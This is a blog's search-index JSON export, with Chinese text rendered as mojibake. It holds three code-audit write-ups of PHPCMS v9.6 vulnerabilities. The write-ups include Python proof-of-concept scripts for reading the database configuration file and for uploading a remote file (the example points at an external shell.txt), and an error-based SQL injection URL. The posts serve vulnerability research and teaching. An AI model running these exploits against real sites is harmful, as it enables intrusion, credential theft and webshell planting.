{"meta":{"title":"Tao's Blog","subtitle":null,"description":"æ…¢æ…¢èµ°ä¼šæ¯”è¾ƒå¿«","author":"Bobtaoy","url":"https://Bobtaoy.github.io","root":"/"},"pages":[{"title":"categories","date":"2020-09-26T06:36:21.000Z","updated":"2020-09-26T06:37:05.719Z","comments":true,"path":"categories/index.html","permalink":"https://bobtaoy.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-09-26T06:38:11.000Z","updated":"2020-09-26T06:41:07.020Z","comments":true,"path":"tags/index.html","permalink":"https://bobtaoy.github.io/tags/index.html","excerpt":"","text":""},{"title":"read","date":"2021-03-07T13:26:36.000Z","updated":"2021-03-08T02:52:15.631Z","comments":true,"path":"read/index.html","permalink":"https://bobtaoy.github.io/read/index.html","excerpt":"","text":"Good articles2021.3.31C.XSS Guide Cross-Site Scripting â€“ Application Security â€“ Google"},{"title":"friend-links","date":"2021-03-16T03:20:52.549Z","updated":"2021-03-16T03:20:52.549Z","comments":true,"path":"links/index.html","permalink":"https://bobtaoy.github.io/links/index.html","excerpt":"","text":""}],"posts":[{"title":"ä»£ç å®¡è®¡ä¹‹PHPCMS v9.6.1 ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´åˆ†æ","slug":"ä»£ç å®¡è®¡ä¹‹PHPCMS-v9-6-1-ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´åˆ†æ","date":"2021-02-10T08:21:17.000Z","updated":"2021-03-16T04:25:37.112Z","comments":true,"path":"2021/02/10/ä»£ç å®¡è®¡ä¹‹PHPCMS-v9-6-1-ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´åˆ†æ/","link":"","permalink":"https://bobtaoy.github.io/2021/02/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMS-v9-6-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"è¿™ä¸ªç‰ˆæœ¬ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å’Œä¸Šä¸€ç¯‡åˆ†æçš„wapSQLæ³¨å…¥æ¼æ´åŸç†æ˜¯ç±»ä¼¼çš„ï¼Œä¸”å‡ºç°æ¼æ´çš„åŸå› éƒ½æ˜¯åœ¨phpcms/modules/content/down.phpæ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™æ¬¡ç›´æ¥å¯¹payloadä¸­çš„å·§å¦™ç‚¹è¿›è¡Œåˆ†æ æ¼æ´åˆ©ç”¨æ‰‹åŠ¨åˆ©ç”¨è·Ÿä¸Šç¯‡wapçš„sqlæ³¨å…¥å·®ä¸å¤šï¼Œè¿™æ¬¡æˆ‘ä»¬ç›´æ¥ä¸Špocè„šæœ¬ 1234567891011121314151617181920212223242526272829&#x27;&#x27;&#x27;Author: Taoversion: python3# æœ¬è„šæœ¬è¯»å–çš„æ˜¯æ•°æ®åº“é…ç½®æ–‡ä»¶&#x27;&#x27;&#x27;import requestsimport sysdef down(url): # step1 url_one = url + &#x27;/index.php?m=wap&amp;c=index&amp;siteid=1&#x27; step1 = requests.get(url_one) userid_flash = step1.headers[&#x27;Set-Cookie&#x27;].split(&#x27;=&#x27;)[1] # step2 url_two = url + &#x27;/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=pad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3D./caches/configs/database%26f%3D.p%25253chp&#x27; # è¯»ä»»æ„æ–‡ä»¶è¿™é‡Œä¿®æ”¹ step2 = requests.post(url_two, data=&#123;&#x27;userid_flash&#x27;: userid_flash&#125;) for cookie in step2.cookies: if &#x27;_att_json&#x27; in cookie.name: att_json = cookie.value url_three = url + &#x27;/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=&#x27; + att_json return url_threeif __name__ == &#x27;__main__&#x27;: url = sys.argv[1] downurl = down(url) print(downurl) æ¼æ´åˆ†æâ€‹ æˆ‘åœ¨åˆ†æè¿™ä¸ªæ¼æ´ï¼ŒæŸ¥èµ„æ–™çš„æ—¶å€™ï¼Œå‘ç°äº†çº¢æ—¥å®‰å…¨å›¢é˜Ÿä¸ƒæœˆç«ä¹Ÿå†™æœ‰è¿™ä¸ªæ¼æ´çš„åˆ†ææ–‡ç« ï¼Œä»–å†™çš„éå¸¸è¯¦ç»†ï¼Œä½ ä»¬å¦‚æœçœ‹ä¸æ‡‚æˆ‘å†™çš„ï¼Œå¯ä»¥å»çœ‹ä»–çš„PHPCMSæ¼æ´åˆ†æåˆé›†(ä¸‹) ï¼ˆæˆ‘æ¯”è¾ƒèœï¼ï¼‰ â€‹ é¦–å…ˆè®¿é—®è„šæœ¬è¿”å›çš„urlï¼Œè°ƒè¯•åˆ†æä¸€ä¸‹phpcms/modules/content/down.phpä¸­initå‡½æ•° 17è¡Œsafe_replaceå‡½æ•°è¿›è¡Œè¿‡æ»¤ï¼Œä½†æ˜¯å¯¹æˆ‘ä»¬ä¼ è¿›å»çš„å€¼æ²¡æœ‰å½±å“ã€‚18è¡Œparse_strå‡½æ•°è§£ææ³¨å†Œå˜é‡ï¼Œå°†$f=%253chp =&gt; å¯¹å…¶è¿›è¡Œä¸€æ¬¡urlè§£ç ä¸º%3cph(è¿™é‡Œå› ä¸º%25 = %)ï¼Œç»§ç»­å¾€ä¸‹èµ°ï¼Œåˆ°76è¡Œ 76-77è¡Œå¯¹fçš„å€¼è¿›è¡Œäº†æ£€æŸ¥ï¼Œç„¶å79è¡Œè¿›è¡Œäº†åŠ å¯†ï¼Œè¿™é‡Œä¸ä¸Šç¯‡wap sqlæ³¨å…¥åˆ†æç±»ä¼¼ï¼Œä½†æ˜¯ä¸åŒçš„æ˜¯è¿™é‡ŒåŠ è§£å¯†çš„ key å˜æˆäº† $pc_auth_key,80è¡Œè¿”å›æˆ‘ä»¬ä¸‹è½½çš„url, ä¼šè°ƒç”¨åŒæ–‡ä»¶ä¸­çš„downloadå‡½æ•° æˆ‘ä»¬ç‚¹å‡»ä¸‹è½½ï¼Œä¸‹æ–­ç‚¹åˆ°88è¡Œï¼Œåˆ†ædownloadå‡½æ•° 90è¡Œå¯¹ä¸Šé¢åŠ å¯†çš„å€¼è¿›è¡Œè§£å¯†ï¼Œç„¶å94è¡Œå†ä¸€æ¬¡è§£ææ³¨å†Œå˜é‡ï¼Œæ­¤æ—¶å°†%3cè¿›è¡Œè§£ç ä¸º&lt;,æ‰€ä»¥$f=.p&lt;hp 103ç»•è¿‡äº†æ£€æŸ¥ï¼Œ108æ‹¼æ¥ï¼Œç»„æˆäº†æˆ‘ä»¬æƒ³è¦ä¸‹è½½çš„phpæ–‡ä»¶ï¼ˆæ–‡ä»¶åè¿˜æ²¡å®Œå…¨å¯¹ï¼‰ åˆ°è¿™ä¸€æ­¥ï¼Œ126è¡Œå°±æ˜¯äº§ç”Ÿæ¼æ´çš„ä¸»è¦åŸå› ï¼Œä¹Ÿå¾ˆå¥½çš„è§£é‡Šäº†ä¸ºä»€ä¹ˆæˆ‘ä»¬ä¼ è¿›å»çš„å€¼æœ‰&lt; ä¸€æ¬¡ str_replace(array(&#39;&lt;&#39;,&#39;&gt;&#39;), &#39;&#39;,$fileurl), æ¶ˆå»&lt;, é€ æˆäº†ä»»æ„æ–‡ä»¶çš„ä¸‹è½½ è¿™æ•´ä¸ªåˆ†æè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¼ è¿›å»çš„payloadä¼šç»è¿‡ä¸¤æ¬¡safe_replace ã€ä¸¤æ¬¡ parse_str,ä¸€æ¬¡ str_replace(array(&#39;&lt;&#39;,&#39;&gt;&#39;), &#39;&#39;,$fileurl)è€Œç¨‹åºå¯¹ .. å’Œ php å­—ç¬¦è¿›è¡Œäº†æ£€æµ‹ã€‚æ‰€ä»¥æˆ‘ä»¬è¦æƒ³è®¿é—® phpæ–‡ä»¶æˆ–è¿›è¡Œè·¯å¾„ç©¿è¶Šï¼Œåç¼€å¯ä»¥è®¾ç½®æˆ ph&gt;p ï¼Œè·¯å¾„ç¬¦å¯ä»¥å˜æˆ .&gt;. ã€‚ä½†æ˜¯ safe_replace å‡½æ•°ä¼š str_replace(&#39;&gt;&#39;,&#39;&gt;&#39;,$string) ï¼Œæ‰€ä»¥ &gt; å­—ç¬¦éœ€è¦ç¼–ç ä¸¤æ¬¡ï¼Œå˜æˆ %25253e æœ€åè´´ä¸€å¼ ä¸ƒæœˆç«å¸ˆå‚…çš„è§¦å‘è¿‡ç¨‹æ•´ç†å›¾ï¼š æ¥æºï¼šçº¢æ—¥å®‰å…¨å›¢é˜Ÿä¸ƒæœˆç« å‚è€ƒï¼š https://xz.aliyun.com/t/5731","categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"https://bobtaoy.github.io/categories/web%E5%AE%89%E5%85%A8/"},{"name":"ä»£ç å®¡è®¡","slug":"webå®‰å…¨/ä»£ç å®¡è®¡","permalink":"https://bobtaoy.github.io/categories/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"PHPä»£ç å®¡è®¡","slug":"PHPä»£ç å®¡è®¡","permalink":"https://bobtaoy.github.io/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"ä»£ç å®¡è®¡ä¹‹PHPCMSv9.6.0 wapæ¨¡å—SQLæ³¨å…¥æ¼æ´åˆ†æ","slug":"ä»£ç å®¡è®¡ä¹‹PHPCMS v9.6.0 wapæ¨¡å—SQLæ³¨å…¥æ¼æ´åˆ†æ","date":"2021-02-09T10:55:00.000Z","updated":"2021-02-09T11:10:02.101Z","comments":true,"path":"2021/02/09/ä»£ç å®¡è®¡ä¹‹PHPCMS v9.6.0 wapæ¨¡å—SQLæ³¨å…¥æ¼æ´åˆ†æ/","link":"","permalink":"https://bobtaoy.github.io/2021/02/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMS%20v9.6.0%20wap%E6%A8%A1%E5%9D%97SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"ä»£ç å®¡è®¡ä¹‹PHPCMS v9.6.0 wapæ¨¡å—SQLæ³¨å…¥æ¼æ´åˆ†ææ¼æ´åˆ©ç”¨æ­¤æ¼æ´åˆ©ç”¨è¿‡ç¨‹å¯èƒ½ç¨æœ‰å¤æ‚ï¼Œæˆ‘ä»¬å¯åˆ†ä¸ºä»¥ä¸‹ä¸‰ä¸ªæ­¥éª¤ï¼š Step1: GETè¯·æ±‚è®¿é—® /index.php?m=wap&amp;c=index&amp;siteid=1 è·å–set-cookieä¸­çš„_siteid ç»“å°¾çš„ cookie å­—æ®µçš„å€¼ step2: 1.POSTè¯·æ±‚è®¿é—® /index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26 æ­¤urlé€šè¿‡urlè§£ç ä¸º: index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=&amp;id=%*27 and updatexml(1,concat(1,(user())),1)#&amp;m=1&amp;f=haha&amp;modelid=2&amp;catid=7&amp;(åˆ©ç”¨æŠ¥é”™æ³¨å…¥ï¼Œè¯­å¥å¯æ›¿æ¢) 2.å°†Step1è·å–_siteid ç»“å°¾çš„ cookie å­—æ®µçš„å€¼ï¼Œèµ‹å€¼ç»™ userid_flash å˜é‡,ä»¥postæ•°æ®æäº¤ è·å–set-cookieä¸­çš„_jsonç»“å°¾å­—æ®µçš„å€¼ step3: è®¿é—®/index.php?m=content&amp;c=down&amp;a_k=step2è·å–çš„_jsonç»“å°¾å­—æ®µçš„å€¼ ä¾‹å¦‚è®¿é—®/index.php?m=content&amp;c=down&amp;a_k=0e72z-2m8OJyw8injqvbY0xJtR5l5UtndXiFZmxcvK9kHkxN1COlnfyINF38Opx6UcdqlABV2gc-8RuG90sS6e31lJn2mxnkJPnUaQDCTAs0gEsKMnL5CHxl-o1hYg2TWaL5blo9RC8ya0yLkSc5NgzCqfTSgZCAlndhgum-OFk1XGARihPaYUs å¤ç°è¿‡ç¨‹æˆªå›¾ï¼šstep1 step2 step3, sqlè¯­å¥æ‰§è¡ŒæˆåŠŸ æ¼æ´åˆ†æå› ä¸ºè¿™é‡Œæœ‰ä¸‰ä¸ªæ­¥éª¤ï¼Œè€Œä¸”å…³è”å¯†åˆ‡ï¼Œæ‰€ä»¥è¿™æ¬¡æˆ‘ä»¬ä»åå¾€å‰åˆ†æï¼Œæœ€åå†ä»æ¢³ç†ä¸€é åˆ†æstep3:â€‹ é¦–å…ˆæˆ‘ä»¬åˆ†æphpcms/modules/content/down.phpä¸­çš„initå‡½æ•°ï¼ˆåˆšå¼€å§‹ä¼šæ‰§è¡Œï¼‰ï¼š 14è¡Œsys_authå‡½æ•°å¯¹$a_kçš„å€¼è¿›è¡Œè§£å¯†ï¼Œç„¶å17è¡Œparse_strå‡½æ•°å¯¹å…¶ä»¥&amp;åˆ†éš”ç¬¦ï¼Œè§£ææ³¨å†Œå˜é‡ï¼Œå…·ä½“parse_strä½œç”¨åŠç”¨æ³•å¦‚ä¸‹ï¼š 123456789101112131415&lt;?php$str = &quot;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&quot;;// æ¨èç”¨æ³•parse_str($str, $output);echo $output[&#x27;first&#x27;]; // valueecho $output[&#x27;arr&#x27;][0]; // foo barecho $output[&#x27;arr&#x27;][1]; // baz// ä¸å»ºè®®è¿™ä¹ˆç”¨parse_str($str);echo $first; // valueecho $arr[0]; // foo barecho $arr[1]; // baz?&gt; 26è¡Œæ‰§è¡ŒsqlæŸ¥è¯¢ï¼Œæˆ‘ä»¬è·Ÿè¿›å»çœ‹ä¸€ä¸‹ èµ°åˆ°ä¸Šå›¾140è¡Œï¼Œæ­¤æ—¶çš„æ‰§è¡Œçš„sqlè¯­å¥æ­£å¥½é€ æˆæŠ¥é”™æ³¨å…¥ åˆ†æstep2:â€‹ æ¥ä¸‹æ¥æˆ‘ä»¬åˆ†æstep2,ä¸ºä»€ä¹ˆPOSTè¯·æ±‚æ•°æ®ä¸­éœ€è¦æ·»åŠ userid_flashå­—æ®µä»¥åŠå¯¹åº”çš„å€¼æ˜¯æ€ä¹ˆæ¥çš„ åœ¨step2è®¿é—®çš„è¯·æ±‚æ–‡ä»¶ä¸­ï¼Œç±»ä¸­çš„æ„é€ å‡½æ•°åˆå§‹åŒ–ä¼šåˆ¤æ–­ï¼ˆ21-23è¡Œï¼‰æ˜¯å¦æœ‰$this-&gt;useridï¼Œé‚£ä¹ˆè¿™ä¸ª$this-&gt;useridæ˜¯æ€ä¹ˆæ¥çš„å‘¢ï¼Œ17è¡Œå¯¹å®ƒè¿›è¡Œäº†èµ‹å€¼ 123$this-&gt;userid = $_SESSION[&#x27;userid&#x27;] ? $_SESSION[&#x27;userid&#x27;] : (param::get_cookie(&#x27;_userid&#x27;) ? param::get_cookie(&#x27;_userid&#x27;) : sys_auth($_POST[&#x27;userid_flash&#x27;],&#x27;DECODE&#x27;));// è¿™ä¸€è¡Œä»£ç ï¼Œé€šè¿‡ä¸‰å…ƒè¿ç®—ç¬¦åˆ¤æ–­$_SESSION[&#x27;userid&#x27;]æ˜¯å¦æœ‰å€¼ï¼Œæˆ‘ä»¬ç¬¬ä¸€æ­¥åˆ©ç”¨ä¸­ï¼Œè‚¯å®šæ˜¯æ²¡æœ‰å€¼çš„ï¼Œç„¶åæ‰§è¡Œ(param::get_cookie(&#x27;_userid&#x27;)ï¼Œç„¶åæˆ‘ä»¬cookieä¹Ÿæ²¡æœ‰_useridï¼Œæ‰€ä»¥æœ€ç»ˆ$this-&gt;userid = sys_auth($_POST[&#x27;userid_flash&#x27;],&#x27;DECODE&#x27;)); sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;))å°±æ˜¯å¯¹æˆ‘ä»¬step2ä¸­userid_flashçš„å€¼è¿›è¡Œè§£å¯†ï¼Œè¿™é‡Œè·Ÿstepè§£å¯†æ˜¯åŒä¸€ä¸ªå‡½æ•°ï¼Œè¿™é‡Œèµ°ä¸‹æ¥ï¼Œ$this-&gt;userid=1ï¼Œå°±è¿‡äº†21è¡Œçš„åˆ¤æ–­ æ¥ç€æˆ‘ä»¬æŸ¥çœ‹ /phpcms/modules/attachment/attachments.phpåˆ†æswfupload_jsonå‡½æ•° è¿™é‡Œä½¿ç”¨äº†safe_replaceå‡½æ•°å¯¹$_GET[&#39;src&#39;]çš„å€¼è¿›è¡Œè¿‡æ»¤ï¼Œå‡½æ•°å†…å®¹å¦‚ä¸‹ 1234567891011121314151617// $_GET[&#x27;src&#x27;] = &amp;id=%*27 and updatexml(1,concat(1,(user())),1)#&amp;m=1&amp;f=haha&amp;modelid=2&amp;catid=7&amp;function safe_replace($string) &#123; $string = str_replace(&#x27;%20&#x27;,&#x27;&#x27;,$string); $string = str_replace(&#x27;%27&#x27;,&#x27;&#x27;,$string); $string = str_replace(&#x27;%2527&#x27;,&#x27;&#x27;,$string); $string = str_replace(&#x27;*&#x27;,&#x27;&#x27;,$string); $string = str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot;&#x27;,$string); $string = str_replace(&quot;&#x27;&quot;,&#x27;&#x27;,$string); $string = str_replace(&#x27;&quot;&#x27;,&#x27;&#x27;,$string); $string = str_replace(&#x27;;&#x27;,&#x27;&#x27;,$string); $string = str_replace(&#x27;&lt;&#x27;,&#x27;&amp;lt;&#x27;,$string); $string = str_replace(&#x27;&gt;&#x27;,&#x27;&amp;gt;&#x27;,$string); $string = str_replace(&quot;&#123;&quot;,&#x27;&#x27;,$string); $string = str_replace(&#x27;&#125;&#x27;,&#x27;&#x27;,$string); $string = str_replace(&#x27;\\\\&#x27;,&#x27;&#x27;,$string); return $string;&#125; ä¸Šé¢id=*%27.. ç»è¿‡safe_replaceå°±å˜æˆäº†id=%27...ï¼ˆåŠ *ç›®çš„å°±æ˜¯ä¸ºäº†è¿‡safe_replaceå‡½æ•°ï¼‰ï¼Œç»§ç»­å¾€åèµ°,å°†æˆ‘ä»¬çš„sqlä»£ç è¿›è¡Œäº†set_cookie ç„¶åè¿™é‡Œçš„set_cookieåˆæ­£å¥½è°ƒç”¨äº†sys_authå‡½æ•°è¿›è¡ŒåŠ å¯† åˆ†æstep1â€‹ userid_flash =a291M4pDz3fa59ilYnOLNL_60K5piWuJbrMMzdL_ /phpcms/libs/classes/param.class.phpä¸­è°ƒç”¨set_cookieä¸­sys_authå‡½æ•°è¿›è¡ŒåŠ å¯†ã€‚ æ¢³ç†æ€»çš„æ¥è¯´å°±æ˜¯step1ä¸­è°ƒç”¨set_cookieä¸­sys_authå‡½æ•°è¿›è¡ŒåŠ å¯†ï¼Œç„¶åstep2ä¸­sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;));è·å–è§£å¯†(ç»•è¿‡æŠ¥é”™)ï¼Œåœ¨è¿™ä¸€æ­¥ï¼ŒGETè¯·æ±‚é™„å¸¦äº†sqlæŠ¥é”™æ³¨å…¥ä¸€å¥ï¼Œä¸”ä½¿ç”¨*ç»•è¿‡safe_replaceï¼Œç„¶ååŠ å¯†ï¼Œåˆ°äº†step3ï¼Œé€šè¿‡$a_kçš„ä¼ å€¼åˆè¿›è¡Œè§£å¯†ï¼Œç„¶åæ‰§è¡Œï¼Œæ¼æ´å°±äº§ç”Ÿäº† å‚è€ƒ https://paper.seebug.org/275/","categories":[{"name":"PHP","slug":"PHP","permalink":"https://bobtaoy.github.io/categories/PHP/"},{"name":"webå®‰å…¨","slug":"PHP/webå®‰å…¨","permalink":"https://bobtaoy.github.io/categories/PHP/web%E5%AE%89%E5%85%A8/"},{"name":"ä»£ç å®¡è®¡","slug":"PHP/webå®‰å…¨/ä»£ç å®¡è®¡","permalink":"https://bobtaoy.github.io/categories/PHP/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"PHPä»£ç å®¡è®¡","slug":"PHPä»£ç å®¡è®¡","permalink":"https://bobtaoy.github.io/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"ä»£ç å®¡è®¡ä¹‹PHPCMS_V9.6.0ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æ","slug":"ä»£ç å®¡è®¡ä¹‹PHPCMSV9-6-ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æ","date":"2021-02-07T01:39:31.000Z","updated":"2021-03-16T02:37:01.309Z","comments":true,"path":"2021/02/07/ä»£ç å®¡è®¡ä¹‹PHPCMSV9-6-ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æ/","link":"","permalink":"https://bobtaoy.github.io/2021/02/07/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMSV9-6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"PHPCMS_V9.6.0ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æå‰è¨€PHPCMSæ˜¯ä¸€æ¬¾ç½‘ç«™ç®¡ç†è½¯ä»¶ã€‚è¯¥è½¯ä»¶é‡‡ç”¨æ¨¡å—åŒ–å¼€å‘,æ”¯æŒå¤šç§åˆ†ç±»æ–¹å¼ã€‚ ç¯å¢ƒæ­å»ºæœ¬æ¬¡PHPCMSç‰ˆæœ¬ä¸º9.6.0,å®‰è£…æ­¥éª¤è·Ÿä¸Šä¸€ç¯‡æ–‡ç« ä¸€æ ·ï¼Œå‚è€ƒPHPCMS_V9.2ä»»æ„æ–‡ä»¶ä¸Šä¼ getshellæ¼æ´åˆ†æ æ¼æ´å¤ç°åœ¨æ³¨å†Œç”¨æˆ·å¤„ï¼Œæ·»åŠ ç”¨æˆ·è¿›è¡ŒæŠ“åŒ…ï¼ˆè¿™é‡Œä»¥Taoä¸ºä¾‹ï¼‰ 123#pocsiteid=1&amp;modelid=11&amp;username=Tao&amp;password=123456&amp;email=Tao@qq.com&amp;info[content]=&lt;img src=http://www.tao.com/t.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=# http://www.tao.com/t.txtæ˜¾ç¤ºçš„å†…å®¹ä¸ºä½ è¦ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹ æœ¬æ¬¡æµ‹è¯•ä¸­, http://www.tao.com/t.txtæ–‡æœ¬å†…å®¹å¦‚ä¸‹ï¼š ä¿®æ”¹ï¼Œæ”¾åŒ…å›æ˜¾å¦‚ä¸‹ï¼Œç„¶åæˆ‘ä»¬è®¿é—®è¯¥è¿”å›çš„url åˆ©ç”¨æˆåŠŸï¼ï¼ï¼è¿™é‡Œå†è´´ä¸ªè„šæœ¬ 12345678910111213141516171819202122232425262728293031323334353637&#x27;&#x27;&#x27;version: python3Author: Tao&#x27;&#x27;&#x27;import requestsimport reimport randomimport sysdef anyfile_up(surl,url): url = &quot;&#123;&#125;/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&quot;.format(url) data = &#123; &#x27;siteid&#x27;: &#x27;1&#x27;, &#x27;modelid&#x27;: &#x27;1&#x27;, &#x27;username&#x27;: &#x27;Tao&#123;&#125;&#x27;.format(random.randint(1,9999)), &#x27;password&#x27;: &#x27;123456&#x27;, &#x27;email&#x27;: &#x27;Tao&#123;&#125;@xxx.com&#x27;.format(random.randint(1,9999)), &#x27;info[content]&#x27;: &#x27;&lt;img src=&#123;&#125;?.php#.jpg&gt;&#x27;.format(surl), &#x27;dosubmit&#x27;: &#x27;1&#x27;, &#x27;protocol&#x27;: &#x27;&#x27; &#125; r = requests.post(url, data=data) return_url = re.findall(r&#x27;img src=(.*)&amp;gt&#x27;,r.text) if len(return_url): return return_url[0]if __name__ == &#x27;__main__&#x27;: if len(sys.argv) == 3: return_url = anyfile_up(sys.argv[1],sys.argv[2]) print(&#x27;seccess! upload file url: &#x27;, return_url) else: message = \\ &quot;&quot;&quot; python3 anyfile_up.py [ä¸Šä¼ å†…å®¹URLåœ°å€] [ç›®æ ‡URL] example: python3 anyfile_up.py http://www.tao.com/shell.txt http://www.phpcms96.com &quot;&quot;&quot; print(message) è¿è¡Œæ•ˆæœå¦‚ä¸‹å›¾ï¼š æ¼æ´åˆ†æè¿™ä¸ªæ¼æ´å­˜åœ¨äºç”¨æˆ·æ³¨å†Œå¤„ï¼Œé€šè¿‡ä¸Šé¢è¯·æ±‚çš„åœ°å€ï¼ˆ/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1ï¼‰,å®šä½å¤„ç†è¯·æ±‚çš„å‡½æ•°ä¸ºregister,ä½äºæ–‡ä»¶phpcms/modules/member/index.php33è¡Œå¤„ã€‚ ä¸ºäº†æ›´å¥½çš„ç†è§£æ¼æ´çš„åŸç†å’Œåˆ©ç”¨çš„å·§å¦™ä¹‹å¤„ï¼Œæˆ‘ä»¬å°±å…ˆçœ‹çœ‹æ­£å¸¸çš„æ³¨å†Œæµç¨‹ã€‚ 123456789101112131415161718192021// 61-79$userinfo = array();$userinfo[&#x27;encrypt&#x27;] = create_randomstr(6);$userinfo[&#x27;username&#x27;] = (isset($_POST[&#x27;username&#x27;]) &amp;&amp; is_username($_POST[&#x27;username&#x27;])) ? $_POST[&#x27;username&#x27;] : exit(&#x27;0&#x27;);$userinfo[&#x27;nickname&#x27;] = (isset($_POST[&#x27;nickname&#x27;]) &amp;&amp; is_username($_POST[&#x27;nickname&#x27;])) ? $_POST[&#x27;nickname&#x27;] : &#x27;&#x27;;$userinfo[&#x27;email&#x27;] = (isset($_POST[&#x27;email&#x27;]) &amp;&amp; is_email($_POST[&#x27;email&#x27;])) ? $_POST[&#x27;email&#x27;] : exit(&#x27;0&#x27;);$userinfo[&#x27;password&#x27;] = (isset($_POST[&#x27;password&#x27;]) &amp;&amp; is_badword($_POST[&#x27;password&#x27;])==false) ? $_POST[&#x27;password&#x27;] : exit(&#x27;0&#x27;);$userinfo[&#x27;email&#x27;] = (isset($_POST[&#x27;email&#x27;]) &amp;&amp; is_email($_POST[&#x27;email&#x27;])) ? $_POST[&#x27;email&#x27;] : exit(&#x27;0&#x27;);$userinfo[&#x27;modelid&#x27;] = isset($_POST[&#x27;modelid&#x27;]) ? intval($_POST[&#x27;modelid&#x27;]) : 10;$userinfo[&#x27;regip&#x27;] = ip();$userinfo[&#x27;point&#x27;] = $member_setting[&#x27;defualtpoint&#x27;] ? $member_setting[&#x27;defualtpoint&#x27;] : 0;$userinfo[&#x27;amount&#x27;] = $member_setting[&#x27;defualtamount&#x27;] ? $member_setting[&#x27;defualtamount&#x27;] : 0;$userinfo[&#x27;regdate&#x27;] = $userinfo[&#x27;lastdate&#x27;] = SYS_TIME;$userinfo[&#x27;siteid&#x27;] = $siteid;$userinfo[&#x27;connectid&#x27;] = isset($_SESSION[&#x27;connectid&#x27;]) ? $_SESSION[&#x27;connectid&#x27;] : &#x27;&#x27;;$userinfo[&#x27;from&#x27;] = isset($_SESSION[&#x27;from&#x27;]) ? $_SESSION[&#x27;from&#x27;] : &#x27;&#x27;; ä¸Šé¢ä»£ç å¯¹ç”¨æˆ·ä¿¡æ¯è¿›è¡Œäº†å¤„ç†ï¼Œ130è¡Œå‰çš„ä»£ç å°±æ˜¯è·å–ä¸€ä¸‹ä¿¡æ¯ï¼Œæ„ä¹‰ä¸å¤§ã€‚ç›´æ¥ä¸‹æ–­ç‚¹åˆ°130è¡Œï¼Œç„¶åF9è·³åˆ°æ­¤å¤„ï¼Œä»£ç å¦‚ä¸‹ï¼š 123456if($member_setting[&#x27;choosemodel&#x27;]) &#123; require_once CACHE_MODEL_PATH.&#x27;member_input.class.php&#x27;; require_once CACHE_MODEL_PATH.&#x27;member_update.class.php&#x27;; $member_input = new member_input($userinfo[&#x27;modelid&#x27;]); $_POST[&#x27;info&#x27;] = array_map(&#x27;new_html_special_chars&#x27;,$_POST[&#x27;info&#x27;]); $user_model_info = $member_input-&gt;get($_POST[&#x27;info&#x27;]); // 135è¡Œï¼Œé‡ç‚¹ èµ°åˆ°135ï¼Œå¯ä»¥å‘ç°ï¼Œè¿™é‡Œ$_POST[&#39;info&#39;]ä¼ å…¥äº†member_inputç±»ä¸­çš„getæ–¹æ³•ï¼Œè·Ÿè¿›è¯¥æ–¹æ³•ã€‚(è¯¥æ–¹æ³•è·³è½¬è‡³ï¼š/caches/caches_model/caches_data/member_input.class.phpæ–‡ä»¶20è¡Œ) ç»§ç»­æ‰§è¡Œå¯å‘ç°ï¼Œåœ¨è¿™ä¸ªgetæ–¹æ³•ä¸­ï¼Œèµ°åˆ°47è¡Œï¼Œè·å–äº†datetimeå‡½æ•°ï¼Œè€Œ48è¡Œä¹Ÿè°ƒç”¨äº†è¯¥å‡½æ•°ã€‚ è¿™é‡Œç•™ä¸€ä¸ªé—®é¢˜ï¼Œä¸ºä»€ä¹ˆ47è¡Œå¤„è·å–çš„æ˜¯datetimeè¿™ä¸ªå‡½æ•°ï¼Ÿ è·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªå‡½æ•°ï¼Œä»£ç å¦‚ä¸‹ï¼š ä¸Šé¢ä»£ç 